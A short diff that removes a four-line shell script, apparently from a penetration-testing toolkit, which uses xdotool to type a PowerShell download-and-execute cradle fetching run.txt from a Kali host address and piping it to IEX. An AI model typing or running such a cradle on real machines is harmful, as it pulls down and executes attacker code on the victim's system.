@@ -1,4 +1,0 @@
-source ~/Desktop/base/code/xdotool/helpers/get_kali_ip
-
-xdotool type --delay 10 "(new-object system.net.webclient).downloadstring('http://${KALI_IP}/b/run.txt') | IEX; "
-xdotool key Return
